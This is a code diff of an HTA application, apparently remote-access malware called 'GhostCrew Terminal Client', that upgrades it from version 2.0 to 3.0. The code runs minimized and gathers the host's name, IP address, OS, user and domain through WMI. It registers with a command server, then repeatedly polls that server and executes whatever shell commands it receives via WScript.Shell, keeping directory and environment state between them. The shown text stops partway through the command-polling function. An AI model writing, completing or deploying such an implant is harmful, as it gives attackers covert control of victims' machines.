@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Terminal Client Autoconnector</title>
+    <title>GhostCrew Terminal Client v3.0</title>
     <HTA:APPLICATION
-        ID="TerminalAutoConnector"
-        APPLICATIONNAME="Terminal Client Autoconnector"
+        ID="GhostCrewTerminalClient"
+        APPLICATIONNAME="GhostCrew Terminal Client"
         BORDER="thin"
         BORDERSTYLE="normal"
         CAPTION="yes"
@@ -15,625 +15,1040 @@
         SHOWINTASKBAR="yes"
         SINGLEINSTANCE="yes"
         SYSMENU="yes"
-        VERSION="2.0"
+        VERSION="3.0"
         WINDOWSTATE="minimize"
         NAVIGABLE="no"
     />
     <style>
         body {
-            font-family: Consolas, monospace;
-            background-color: #000;
-            color: #0f0;
-            padding: 5px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            background-color: #0a0a0a;
+            color: #00ff41;
+            padding: 8px;
             margin: 0;
             overflow: hidden;
-        }
-        .log {
-            height: 200px;
-            overflow-y: auto;
             font-size: 11px;
-            line-height: 1.3;
         }
-        .status {
+        .header {
+            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
+            color: #00ff41;
+            padding: 6px 10px;
+            border: 1px solid #333;
+            margin-bottom: 5px;
+            font-weight: bold;
+            text-align: center;
+            border-radius: 3px;
+        }
+        .log-container {
+            height: 140px;
+            overflow-y: auto;
+            background-color: #111;
+            border: 1px solid #333;
+            padding: 5px;
+            margin-bottom: 5px;
+            font-size: 10px;
+            line-height: 1.2;
+        }
+        .status-bar {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            padding: 5px;
-            background-color: #333;
-            border-top: 1px solid #0f0;
+            padding: 4px 8px;
+            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
+            border-top: 1px solid #00ff41;
             font-size: 10px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+        }
+        .connection-info {
+            color: #00ff41;
+        }
+        .session-info {
+            color: #ffaa00;
+        }
+        .error { color: #ff4444; }
+        .success { color: #00ff41; }
+        .warning { color: #ffaa00; }
+        .info { color: #4488ff; }
+        .command { color: #ff6600; font-weight: bold; }
+        .output { color: #cccccc; }
+        
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 4px;
         }
     </style>
+    <script>
+        /*! JSON v3.3.2 | http://bestiejs.github.io/json3 | Copyright 2012-2014, Kit Cambridge | http://kit.mit-license.org */
+        (function(){function N(p,r){function q(a){if(q[a]!==w)return q[a];var c;if("bug-string-char-index"==a)c="a"!="a"[0];else if("json"==a)c=q("json-stringify")&&q("json-parse");else{var e;if("json-stringify"==a){c=r.stringify;var b="function"==typeof c&&s;if(b){(e=function(){return 1}).toJSON=e;try{b="0"===c(0)&&"0"===c(new t)&&'""'==c(new A)&&c(u)===w&&c(w)===w&&c()===w&&"1"===c(e)&&"[1]"==c([e])&&"[null]"==c([w])&&"null"==c(null)&&"[null,null,null]"==c([w,u,null])&&'{"a":[1,true,false,null,"\\u0000\\b\\n\\f\\r\\t"]}'==c({a:[e,!0,!1,null,"\x00\b\n\f\r\t"]})&&"1"===c(null,e)&&"[\n 1,\n 2\n]"==c([1,2],null,1)&&'"-271821-04-20T00:00:00.000Z"'==c(new C(-864E13))&&'"+275760-09-13T00:00:00.000Z"'==c(new C(864E13))&&'"-000001-01-01T00:00:00.000Z"'==c(new C(-621987552E5))&&'"1969-12-31T23:59:59.999Z"'==c(new C(-1))}catch(f){b=!1}}c=b}if("json-parse"==a){c=r.parse;if("function"==typeof c)try{if(0===c("0")&&!c(!1)){e=c('{"a":[1,true,false,null,"\\u0000\\b\\n\\f\\r\\t"]}');var n=5==e.a.length&&1===e.a[0];if(n){try{n=!c('"\t"')}catch(d){}if(n)try{n=1!==c("01")}catch(g){}if(n)try{n=1!==c("1.")}catch(m){}}}}catch(X){n=!1}c=n}}return q[a]=!!c}p||(p=k.Object());r||(r=k.Object());var t=p.Number||k.Number,A=p.String||k.String,H=p.Object||k.Object,C=p.Date||k.Date,G=p.SyntaxError||k.SyntaxError,K=p.TypeError||k.TypeError,L=p.Math||k.Math,I=p.JSON||k.JSON;"object"==typeof I&&I&&(r.stringify=I.stringify,r.parse=I.parse);var H=H.prototype,u=H.toString,v,B,w,s=new C(-0xc782b5b800cec);try{s=-109252==s.getUTCFullYear()&&0===s.getUTCMonth()&&1===s.getUTCDate()&&10==s.getUTCHours()&&37==s.getUTCMinutes()&&6==s.getUTCSeconds()&&708==s.getUTCMilliseconds()}catch(Q){}if(!q("json")){var D=q("bug-string-char-index");if(!s)var x=L.floor,M=[0,31,59,90,120,151,181,212,243,273,304,334],E=function(a,c){return M[c]+365*(a-1970)+x((a-1969+(c=+(1<c)))/4)-x((a-1901+c)/100)+x((a-1601+c)/400)};(v=H.hasOwnProperty)||(v=function(a){var c={},e;(c.__proto__=null,c.__proto__={toString:1},c).toString!=u?v=function(a){var c=this.__proto__;a=a in(this.__proto__=null,this);this.__proto__=c;return a}:(e=c.constructor,v=function(a){var c=(this.constructor||e).prototype;return a in this&&!(a in c&&this[a]===c[a])});c=null;return v.call(this,a)});B=function(a,c){var e=0,b,f,n;(b=function(){this.valueOf=0}).prototype.valueOf=0;f=new b;for(n in f)v.call(f,n)&&e++;b=f=null;e?B=2==e?function(a,c){var e={},b="[object Function]"==u.call(a),f;for(f in a)b&&"prototype"==f||v.call(e,f)||!(e[f]=1)||!v.call(a,f)||c(f)}:function(a,c){var e="[object Function]"==u.call(a),b,f;for(b in a)e&&"prototype"==b||!v.call(a,b)||(f="constructor"===b)||c(b);(f||v.call(a,b="constructor"))&&c(b)}:(f="valueOf toString toLocaleString propertyIsEnumerable isPrototypeOf hasOwnProperty constructor".split(" "),B=function(a,c){var e="[object Function]"==u.call(a),b,h=!e&&"function"!=typeof a.constructor&&F[typeof a.hasOwnProperty]&&a.hasOwnProperty||v;for(b in a)e&&"prototype"==b||!h.call(a,b)||c(b);for(e=f.length;b=f[--e];h.call(a,b)&&c(b));});return B(a,c)};if(!q("json-stringify")){var U={92:"\\\\",34:'\\"',8:"\\b",12:"\\f",10:"\\n",13:"\\r",9:"\\t"},y=function(a,c){return("000000"+(c||0)).slice(-a)},R=function(a){for(var c='"',b=0,h=a.length,f=!D||10<h,n=f&&(D?a.split(""):a);b<h;b++){var d=a.charCodeAt(b);switch(d){case 8:case 9:case 10:case 12:case 13:case 34:case 92:c+=U[d];break;default:if(32>d){c+="\\u00"+y(2,d.toString(16));break}c+=f?n[b]:a.charAt(b)}}return c+'"'},O=function(a,c,b,h,f,n,d){var g,m,k,l,p,r,s,t,q;try{g=c[a]}catch(z){}if("object"==typeof g&&g)if(m=u.call(g),"[object Date]"!=m||v.call(g,"toJSON"))"function"==typeof g.toJSON&&("[object Number]"!=m&&"[object String]"!=m&&"[object Array]"!=m||v.call(g,"toJSON"))&&(g=g.toJSON(a));else if(g>-1/0&&g<1/0){if(E){l=x(g/864E5);for(m=x(l/365.2425)+1970-1;E(m+1,0)<=l;m++);for(k=x((l-E(m,0))/30.42);E(m,k+1)<=l;k++);l=1+l-E(m,k);p=(g%864E5+864E5)%864E5;r=x(p/36E5)%24;s=x(p/6E4)%60;t=x(p/1E3)%60;p%=1E3}else m=g.getUTCFullYear(),k=g.getUTCMonth(),l=g.getUTCDate(),r=g.getUTCHours(),s=g.getUTCMinutes(),t=g.getUTCSeconds(),p=g.getUTCMilliseconds();g=(0>=m||1E4<=m?(0>m?"-":"+")+y(6,0>m?-m:m):y(4,m))+"-"+y(2,k+1)+"-"+y(2,l)+"T"+y(2,r)+":"+y(2,s)+":"+y(2,t)+"."+y(3,p)+"Z"}else g=null;b&&(g=b.call(c,a,g));if(null===g)return"null";m=u.call(g);if("[object Boolean]"==m)return""+g;if("[object Number]"==m)return g>-1/0&&g<1/0?""+g:"null";if("[object String]"==m)return R(""+g);if("object"==typeof g){for(a=d.length;a--;)if(d[a]===g)throw K();d.push(g);q=[];c=n;n+=f;if("[object Array]"==m){k=0;for(a=g.length;k<a;k++)m=O(k,g,b,h,f,n,d),q.push(m===w?"null":m);a=q.length?f?"[\n"+n+q.join(",\n"+n)+"\n"+c+"]":"["+q.join(",")+"]":"[]"}else B(h||g,function(a){var c=O(a,g,b,h,f,n,d);c!==w&&q.push(R(a)+":"+(f?" ":"")+c)}),a=q.length?f?"{\n"+n+q.join(",\n"+n)+"\n"+c+"}":"{"+q.join(",")+"}":"{}";d.pop();return a}};r.stringify=function(a,c,b){var h,f,n,d;if(F[typeof c]&&c)if("[object Function]"==(d=u.call(c)))f=c;else if("[object Array]"==d){n={};for(var g=0,k=c.length,l;g<k;l=c[g++],(d=u.call(l),"[object String]"==d||"[object Number]"==d)&&(n[l]=1));}if(b)if("[object Number]"==(d=u.call(b))){if(0<(b-=b%1))for(h="",10<b&&(b=10);h.length<b;h+=" ");}else"[object String]"==d&&(h=10>=b.length?b:b.slice(0,10));return O("",(l={},l[""]=a,l),f,n,h,"",[])}}if(!q("json-parse")){var V=A.fromCharCode,W={92:"\\",34:'"',47:"/",98:"\b",116:"\t",110:"\n",102:"\f",114:"\r"},b,J,l=function(){b=J=null;throw G();},z=function(){for(var a=J,c=a.length,e,h,f,k,d;b<c;)switch(d=a.charCodeAt(b),d){case 9:case 10:case 13:case 32:b++;break;case 123:case 125:case 91:case 93:case 58:case 44:return e=D?a.charAt(b):a[b],b++,e;case 34:e="@";for(b++;b<c;)if(d=a.charCodeAt(b),32>d)l();else if(92==d)switch(d=a.charCodeAt(++b),d){case 92:case 34:case 47:case 98:case 116:case 110:case 102:case 114:e+=W[d];b++;break;case 117:h=++b;for(f=b+4;b<f;b++)d=a.charCodeAt(b),48<=d&&57>=d||97<=d&&102>=d||65<=d&&70>=d||l();e+=V("0x"+a.slice(h,b));break;default:l()}else{if(34==d)break;d=a.charCodeAt(b);for(h=b;32<=d&&92!=d&&34!=d;)d=a.charCodeAt(++b);e+=a.slice(h,b)}if(34==a.charCodeAt(b))return b++,e;l();default:h=b;45==d&&(k=!0,d=a.charCodeAt(++b));if(48<=d&&57>=d){for(48==d&&(d=a.charCodeAt(b+1),48<=d&&57>=d)&&l();b<c&&(d=a.charCodeAt(b),48<=d&&57>=d);b++);if(46==a.charCodeAt(b)){for(f=++b;f<c&&(d=a.charCodeAt(f),48<=d&&57>=d);f++);f==b&&l();b=f}d=a.charCodeAt(b);if(101==d||69==d){d=a.charCodeAt(++b);43!=d&&45!=d||b++;for(f=b;f<c&&(d=a.charCodeAt(f),48<=d&&57>=d);f++);f==b&&l();b=f}return+a.slice(h,b)}k&&l();if("true"==a.slice(b,b+4))return b+=4,!0;if("false"==a.slice(b,b+5))return b+=5,!1;if("null"==a.slice(b,b+4))return b+=4,null;l()}return"$"},P=function(a){var c,b;"$"==a&&l();if("string"==typeof a){if("@"==(D?a.charAt(0):a[0]))return a.slice(1);if("["==a){for(c=[];;b||(b=!0)){a=z();if("]"==a)break;b&&(","==a?(a=z(),"]"==a&&l()):l());","==a&&l();c.push(P(a))}return c}if("{"==a){for(c={};;b||(b=!0)){a=z();if("}"==a)break;b&&(","==a?(a=z(),"}"==a&&l()):l());","!=a&&"string"==typeof a&&"@"==(D?a.charAt(0):a[0])&&":"==z()||l();c[a.slice(1)]=P(z())}return c}l()}return a},T=function(a,b,e){e=S(a,b,e);e===w?delete a[b]:a[b]=e},S=function(a,b,e){var h=a[b],f;if("object"==typeof h&&h)if("[object Array]"==u.call(h))for(f=h.length;f--;)T(h,f,e);else B(h,function(a){T(h,a,e)});return e.call(a,b,h)};r.parse=function(a,c){var e,h;b=0;J=""+a;e=P(z());"$"!=z()&&l();b=J=null;return c&&"[object Function]"==u.call(c)?S((h={},h[""]=e,h),"",c):e}}}r.runInContext=N;return r}var K=typeof define==="function"&&define.amd,F={"function":!0,object:!0},G=F[typeof exports]&&exports&&!exports.nodeType&&exports,k=F[typeof window]&&window||this,t=G&&F[typeof module]&&module&&!module.nodeType&&"object"==typeof global&&global;!t||t.global!==t&&t.window!==t&&t.self!==t||(k=t);if(G&&!K)N(k,G);else{var L=k.JSON,Q=k.JSON3,M=!1,A=N(k,k.JSON3={noConflict:function(){M||(M=!0,k.JSON=L,k.JSON3=Q,L=Q=null);return A}});k.JSON={parse:A.parse,stringify:A.stringify}}K&&define(function(){return A})}).call(this);
+    </script>
 </head>
 <body>
-    <div class="log" id="log"></div>
-    <div class="status" id="status">Initializing...</div>
+    <div class="header">
+        🔥 GhostCrew Terminal Client v3.0 - Enhanced Shell Session Support 🔥
+    </div>
+    
+    <div class="log-container" id="log-container">
+        <!-- Log messages will appear here -->
+    </div>
+    
+    <div class="status-bar">
+        <div class="connection-info" id="connection-status">Initializing...</div>
+        <div class="session-info" id="session-info">No active session</div>
+    </div>
 
     <script>
-        // Config
-        var SERVER_URL = "http://localhost/GhostCrew/api.php";
-        var POLL_INTERVAL = 2000; // 2 seconds
-        var AUTO_RECONNECT = true;
-        
-        // Variables
-        var hostId = null;
-        var currentSessionId = null;
-        var pollTimer = null;
-        var isConnected = false;
-        var reconnectAttempts = 0;
-        var lastCommandTime = 0;
-        var shellProcess = null;
-        var currentDirectory = null;
-        var environmentVars = {};
-        
-        // Initialize on load
-        window.onload = function() {
-            initAutoConnect();
-            
-            // Auto-minimize after brief delay
-            setTimeout(function() {
-                try {
-                    window.resizeTo(400, 250);
-                    setTimeout(function() {
-                        window.blur();
-                    }, 2000);
-                } catch(e) {
-                    logMessage("Error resizing window: " + e.message);
-                }
-            }, 500);
+        // ===================== CONFIGURATION =====================
+        var CONFIG = {
+            SERVER_URL: "http://localhost/GhostCrew/api.php",
+            POLL_INTERVAL: 1500,  // Poll every 1.5 seconds for better responsiveness
+            PING_INTERVAL: 30000, // Ping server every 30 seconds
+            AUTO_RECONNECT: true,
+            MAX_RECONNECT_ATTEMPTS: 10,
+            RECONNECT_DELAY_BASE: 3000, // Base delay between reconnections
+            MAX_LOG_LINES: 150,
+            COMMAND_TIMEOUT: 300000, // 5 minutes timeout for long-running commands
+            DEBUG: true
         };
+
+        // ===================== GLOBAL VARIABLES =====================
+        var SYSTEM = {
+            hostId: null,
+            isConnected: false,
+            isRegistered: false,
+            reconnectAttempts: 0,
+            lastActivity: 0,
+            systemInfo: null
+        };
+
+        var SESSION = {
+            activeSessionId: null,
+            currentDirectory: null,
+            environmentVars: {},
+            shellProcess: null,
+            commandQueue: [],
+            processingCommand: false,
+            sessionStartTime: null
+        };
+
+        var TIMERS = {
+            pollTimer: null,
+            pingTimer: null,
+            reconnectTimer: null
+        };
+
+        // ===================== UTILITY FUNCTIONS =====================
         
-        function initAutoConnect() {
-            logMessage("Terminal Auto-Connector v2.0 starting...");
-            logMessage("Enhanced with persistent shell support");
-            
-            // Check if previously connected
-            var savedHostId = localStorage.getItem("hostId");
-            if (savedHostId) {
-                hostId = savedHostId;
-                logMessage("Found previous connection ID: " + hostId);
-            }
-            
-            // Initialize shell environment
-            initializeShell();
-            
-            // Start connection immediately
-            connect();
+        // Console compatibility for older IE versions
+        if (typeof console === 'undefined') {
+            window.console = {
+                log: function() {},
+                error: function() {},
+                warn: function() {},
+                info: function() {}
+            };
         }
         
+        // Object.keys compatibility for older IE versions
+        if (!Object.keys) {
+            Object.keys = function(obj) {
+                var keys = [];
+                for (var key in obj) {
+                    if (obj.hasOwnProperty(key)) {
+                        keys.push(key);
+                    }
+                }
+                return keys;
+            };
+        }
+        
+        // String methods compatibility for older IE
+        if (!String.prototype.trim) {
+            String.prototype.trim = function() {
+                return this.replace(/^\s+|\s+$/g, '');
+            };
+        }
+        
+        if (!String.prototype.startsWith) {
+            String.prototype.startsWith = function(searchString) {
+                return this.indexOf(searchString) === 0;
+            };
+        }
+        
+        function log(message, type) {
+            type = type || 'info';
+            var timestamp = new Date().toLocaleTimeString();
+            var logContainer = document.getElementById('log-container');
+            var className = type;
+            
+            var logEntry = document.createElement('div');
+            logEntry.className = className;
+            logEntry.innerHTML = '[' + timestamp + '] ' + message;
+            
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            // Limit log lines
+            var logLines = logContainer.children;
+            if (logLines.length > CONFIG.MAX_LOG_LINES) {
+                logContainer.removeChild(logLines[0]);
+            }
+            
+            // Only log to console if it's actually available and functional
+            if (CONFIG.DEBUG && typeof console !== 'undefined' && console.log) {
+                try {
+                    console.log('[' + type.toUpperCase() + '] ' + message);
+                } catch(e) {
+                    // Ignore console errors in HTA environment
+                }
+            }
+        }
+
+        function updateConnectionStatus(status) {
+            document.getElementById('connection-status').textContent = status;
+            document.title = 'GhostCrew Client - ' + status;
+        }
+
+        function updateSessionInfo(info) {
+            document.getElementById('session-info').textContent = info;
+        }
+
+        function generateUniqueId() {
+            return 'host_' + new Date().getTime() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        function escapeHtml(text) {
+            var div = document.createElement('div');
+            div.appendChild(document.createTextNode(text));
+            return div.innerHTML;
+        }
+
+        // ===================== SHELL MANAGEMENT =====================
         function initializeShell() {
             try {
-                // Create persistent shell object
-                shellProcess = new ActiveXObject("WScript.Shell");
+                SESSION.shellProcess = new ActiveXObject("WScript.Shell");
+                SESSION.currentDirectory = SESSION.shellProcess.ExpandEnvironmentStrings("%USERPROFILE%");
                 
-                // Get initial working directory
-                currentDirectory = shellProcess.ExpandEnvironmentStrings("%CD%");
-                logMessage("Shell initialized. Working directory: " + currentDirectory);
+                // Initialize common environment variables
+                var commonVars = ["PATH", "TEMP", "TMP", "USERPROFILE", "COMPUTERNAME", "USERNAME", "USERDOMAIN", "PROCESSOR_ARCHITECTURE"];
+                SESSION.environmentVars = {};
                 
-                // Store common environment variables
-                var commonEnvVars = ["PATH", "TEMP", "USERPROFILE", "COMPUTERNAME", "USERNAME"];
-                for (var i = 0; i < commonEnvVars.length; i++) {
+                var loadedVarsCount = 0;
+                for (var i = 0; i < commonVars.length; i++) {
                     try {
-                        environmentVars[commonEnvVars[i]] = shellProcess.ExpandEnvironmentStrings("%" + commonEnvVars[i] + "%");
+                        var varName = commonVars[i];
+                        var varValue = SESSION.shellProcess.ExpandEnvironmentStrings("%" + varName + "%");
+                        if (varValue && varValue !== ("%" + varName + "%")) {
+                            SESSION.environmentVars[varName] = varValue;
+                            loadedVarsCount++;
+                        }
                     } catch(e) {
-                        // Skip if env var doesn't exist
+                        // Skip unavailable environment variables
                     }
                 }
                 
+                log("Shell initialized successfully", "success");
+                log("Working directory: " + SESSION.currentDirectory, "info");
+                log("Environment variables loaded: " + loadedVarsCount, "info");
+                
+                return true;
             } catch (e) {
-                logMessage("Error initializing shell: " + e.message);
+                log("Failed to initialize shell: " + e.message, "error");
+                return false;
             }
         }
-        
-        function connect() {
-            updateStatus("Connecting to server...");
-            logMessage("Attempting connection to server...");
-            
-            // Get system information
-            var systemInfo = getSystemInfo();
+
+        function resetShellForNewSession() {
+            try {
+                // Reset to user profile directory for new sessions
+                SESSION.currentDirectory = SESSION.shellProcess.ExpandEnvironmentStrings("%USERPROFILE%");
+                log("Shell environment reset for new session", "info");
+                log("Working directory reset to: " + SESSION.currentDirectory, "info");
+            } catch (e) {
+                log("Error resetting shell environment: " + e.message, "error");
+            }
+        }
+
+        // ===================== SYSTEM INFORMATION =====================
+        function collectSystemInfo() {
+            var info = {
+                hostname: "Unknown",
+                ipAddress: "127.0.0.1",
+                osInfo: "Unknown",
+                userInfo: "Unknown",
+                architecture: "Unknown",
+                domain: "Unknown"
+            };
+
+            try {
+                // Get network information
+                var network = new ActiveXObject("WScript.Network");
+                info.hostname = network.ComputerName || "Unknown";
+                info.userInfo = (network.UserDomain ? network.UserDomain + "\\" : "") + network.UserName;
+                info.domain = network.UserDomain || "WORKGROUP";
+
+                // Get system information via WMI
+                var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+                
+                // OS Information
+                var osQuery = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
+                var osEnum = new Enumerator(osQuery);
+                if (!osEnum.atEnd()) {
+                    var osItem = osEnum.item();
+                    info.osInfo = osItem.Caption + " " + osItem.Version;
+                    if (osItem.OSArchitecture) {
+                        info.architecture = osItem.OSArchitecture;
+                    }
+                }
+
+                // Network adapter information for IP
+                var nicQuery = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
+                var nicEnum = new Enumerator(nicQuery);
+                
+                while (!nicEnum.atEnd()) {
+                    var nicItem = nicEnum.item();
+                    if (nicItem.IPAddress) {
+                        var ipArray = new VBArray(nicItem.IPAddress).toArray();
+                        for (var i = 0; i < ipArray.length; i++) {
+                            var ip = ipArray[i];
+                            // Look for IPv4 address that's not loopback
+                            if (ip.indexOf('.') > 0 && ip !== '127.0.0.1' && !ip.startsWith('169.254.')) {
+                                info.ipAddress = ip;
+                                break;
+                            }
+                        }
+                        if (info.ipAddress !== "127.0.0.1") break;
+                    }
+                    nicEnum.moveNext();
+                }
+
+            } catch (e) {
+                log("Error collecting system information: " + e.message, "error");
+            }
+
+            SYSTEM.systemInfo = info;
+            log("System Info: " + info.hostname + " (" + info.ipAddress + ") - " + info.userInfo, "info");
+            return info;
+        }
+
+        // ===================== SERVER COMMUNICATION =====================
+        function makeServerRequest(action, data, callback, timeout) {
+            timeout = timeout || 30000; // 30 second default timeout
             
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", SERVER_URL, true);
+            xhr.open("POST", CONFIG.SERVER_URL, true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.timeout = timeout;
+            
+            var requestData = "action=" + encodeURIComponent(action);
+            if (data) {
+                for (var key in data) {
+                    if (data.hasOwnProperty(key)) {
+                        requestData += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(data[key]);
+                    }
+                }
+            }
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200) {
                         try {
                             var response = JSON.parse(xhr.responseText);
-                            if (response.status === "success") {
-                                hostId = response.host_id;
-                                localStorage.setItem("hostId", hostId);
-                                
-                                updateStatus("Connected as " + systemInfo.hostname);
-                                logMessage("Successfully connected with ID: " + hostId);
-                                
-                                // Start polling for commands
-                                isConnected = true;
-                                reconnectAttempts = 0;
-                                lastCommandTime = new Date().getTime();
-                                startPolling();
-                            } else {
-                                handleConnectionError("Server returned error: " + response.message);
-                            }
+                            if (callback) callback(null, response);
                         } catch (e) {
-                            handleConnectionError("Error parsing server response: " + e.message);
+                            log("JSON parse error: " + e.message, "error");
+                            if (callback) callback(e, null);
                         }
                     } else {
-                        handleConnectionError("Server returned status: " + xhr.status);
+                        var error = new Error("HTTP " + xhr.status + ": " + xhr.statusText);
+                        if (callback) callback(error, null);
                     }
                 }
             };
             
             xhr.onerror = function() {
-                handleConnectionError("Network error occurred");
+                var error = new Error("Network error");
+                if (callback) callback(error, null);
             };
             
-            // Build data to send
-            var formData = "action=register_host";
-            if (hostId) {
-                formData += "&host_id=" + encodeURIComponent(hostId);
-            }
-            formData += "&hostname=" + encodeURIComponent(systemInfo.hostname);
-            formData += "&ip_address=" + encodeURIComponent(systemInfo.ipAddress);
-            formData += "&os_info=" + encodeURIComponent(systemInfo.osInfo);
+            xhr.ontimeout = function() {
+                var error = new Error("Request timeout");
+                if (callback) callback(error, null);
+            };
             
-            // Send request
-            xhr.send(formData);
+            xhr.send(requestData);
         }
-        
-        function startPolling() {
-            // Clear any existing interval
-            stopPolling();
+
+        function registerWithServer() {
+            if (!SYSTEM.systemInfo) {
+                collectSystemInfo();
+            }
             
-            // Start new polling interval
-            pollTimer = setInterval(pollForCommands, POLL_INTERVAL);
-            logMessage("Started polling for commands (every " + (POLL_INTERVAL/1000) + " seconds)");
+            log("Registering with server...", "info");
+            updateConnectionStatus("Registering...");
             
-            // Set up watchdog timer
-            setInterval(function() {
-                var now = new Date().getTime();
-                if (isConnected && (now - lastCommandTime > 300000)) {
-                    logMessage("No activity for 5 minutes, checking connection...");
-                    pingServer();
+            var registrationData = {
+                hostname: SYSTEM.systemInfo.hostname,
+                ip_address: SYSTEM.systemInfo.ipAddress,
+                os_info: SYSTEM.systemInfo.osInfo + " (" + SYSTEM.systemInfo.architecture + ")"
+            };
+            
+            if (SYSTEM.hostId) {
+                registrationData.host_id = SYSTEM.hostId;
+            }
+            
+            makeServerRequest("register_host", registrationData, function(error, response) {
+                if (error) {
+                    log("Registration failed: " + error.message, "error");
+                    handleConnectionError(error);
+                    return;
                 }
-            }, 60000);
-        }
-        
-        function stopPolling() {
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-                logMessage("Stopped polling for commands");
-            }
-        }
-        
-        function pollForCommands() {
-            if (!isConnected || !hostId) return;
-            
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", SERVER_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        try {
-                            var response = JSON.parse(xhr.responseText);
-                            if (response.status === "success") {
-                                lastCommandTime = new Date().getTime();
-                                
-                                if (response.command && response.command !== "") {
-                                    logMessage("Received command: " + response.command);
-                                    
-                                    // Check if this is a new session
-                                    if (response.session_id && response.session_id !== currentSessionId) {
-                                        logMessage("New session started: " + response.session_id);
-                                        currentSessionId = response.session_id;
-                                        // Reset shell environment for new session
-                                        resetShellEnvironment();
-                                    }
-                                    
-                                    executeCommand(response.command_id, response.command, response.session_id);
-                                }
-                            } else {
-                                logMessage("Error polling for commands: " + response.message);
-                            }
-                        } catch (e) {
-                            logMessage("Error parsing command response: " + e.message);
-                        }
-                    } else {
-                        logMessage("Server error while polling: " + xhr.status);
-                        if (AUTO_RECONNECT) {
-                            isConnected = false;
-                            attemptReconnect();
-                        }
+                
+                if (response.status === "success") {
+                    SYSTEM.hostId = response.host_id;
+                    SYSTEM.isRegistered = true;
+                    SYSTEM.isConnected = true;
+                    SYSTEM.reconnectAttempts = 0;
+                    SYSTEM.lastActivity = new Date().getTime();
+                    
+                    // Persist host ID
+                    try {
+                        localStorage.setItem("ghostcrew_host_id", SYSTEM.hostId);
+                    } catch(e) {
+                        // LocalStorage not available in some IE versions
                     }
-                }
-            };
-            
-            xhr.onerror = function() {
-                logMessage("Network error while polling for commands");
-                if (AUTO_RECONNECT) {
-                    isConnected = false;
-                    attemptReconnect();
-                }
-            };
-            
-            xhr.send("action=get_command&host_id=" + encodeURIComponent(hostId));
-        }
-        
-        function resetShellEnvironment() {
-            try {
-                // Reset to system drive root
-                var systemDrive = shellProcess.ExpandEnvironmentStrings("%SystemDrive%");
-                currentDirectory = systemDrive + "\\";
-                logMessage("Shell environment reset for new session. Working directory: " + currentDirectory);
-            } catch (e) {
-                logMessage("Error resetting shell environment: " + e.message);
-            }
-        }
-        
-        function executeCommand(commandId, command, sessionId) {
-            logMessage("Executing command: " + command);
-            updateStatus("Running: " + command);
-            
-            var startTime = new Date().getTime();
-            var output = "";
-            var success = true;
-            
-            try {
-                // Handle special commands that affect shell state
-                if (command.toLowerCase().startsWith("cd ")) {
-                    output = handleChangeDirectory(command);
-                } else if (command.toLowerCase().startsWith("set ")) {
-                    output = handleSetEnvironmentVariable(command);
-                } else if (command.toLowerCase() === "pwd" || command.toLowerCase() === "cd") {
-                    output = currentDirectory;
+                    
+                    log("Successfully registered with server", "success");
+                    log("Host ID: " + SYSTEM.hostId, "info");
+                    updateConnectionStatus("Connected - " + SYSTEM.systemInfo.hostname);
+                    
+                    startServices();
                 } else {
-                    // Execute regular command with persistent context
-                    output = executeCommandWithContext(command);
+                    log("Registration failed: " + response.message, "error");
+                    handleConnectionError(new Error(response.message));
+                }
+            });
+        }
+
+        function startServices() {
+            // Start command polling
+            if (TIMERS.pollTimer) clearInterval(TIMERS.pollTimer);
+            TIMERS.pollTimer = setInterval(pollForCommands, CONFIG.POLL_INTERVAL);
+            
+            // Start ping timer
+            if (TIMERS.pingTimer) clearInterval(TIMERS.pingTimer);
+            TIMERS.pingTimer = setInterval(pingServer, CONFIG.PING_INTERVAL);
+            
+            log("Services started - Polling every " + (CONFIG.POLL_INTERVAL/1000) + "s", "success");
+        }
+
+        function stopServices() {
+            if (TIMERS.pollTimer) {
+                clearInterval(TIMERS.pollTimer);
+                TIMERS.pollTimer = null;
+            }
+            if (TIMERS.pingTimer) {
+                clearInterval(TIMERS.pingTimer);
+                TIMERS.pingTimer = null;
+            }
+            if (TIMERS.reconnectTimer) {
+                clearInterval(TIMERS.reconnectTimer);
+                TIMERS.reconnectTimer = null;
+            }
+            log("All services stopped", "info");
+        }
+
+        function pingServer() {
+            if (!SYSTEM.isConnected || !SYSTEM.hostId) return;
+            
+            makeServerRequest("ping_host", { host_id: SYSTEM.hostId }, function(error, response) {
+                if (error) {
+                    log("Ping failed: " + error.message, "warning");
+                    handleConnectionError(error);
+                    return;
                 }
                 
-            } catch (e) {
-                output = "Error: " + e.message;
-                success = false;
-                logMessage("Error executing command: " + e.message);
+                if (response.status === "success") {
+                    SYSTEM.lastActivity = new Date().getTime();
+                    // log("Server ping successful", "info");  // Comment out to reduce log spam
+                } else {
+                    log("Ping error: " + response.message, "warning");
+                    handleConnectionError(new Error(response.message));
+                }
+            });
+        }
+
+        // ===================== COMMAND PROCESSING =====================
+        function pollForCommands() {
+            if (!SYSTEM.isConnected || !SYSTEM.hostId || SESSION.processingCommand) {
+                return;
             }
             
-            var endTime = new Date().getTime();
-            var executionTime = (endTime - startTime) / 1000;
-            
-            // Send the result back to the server
-            submitCommandResult(commandId, output, executionTime);
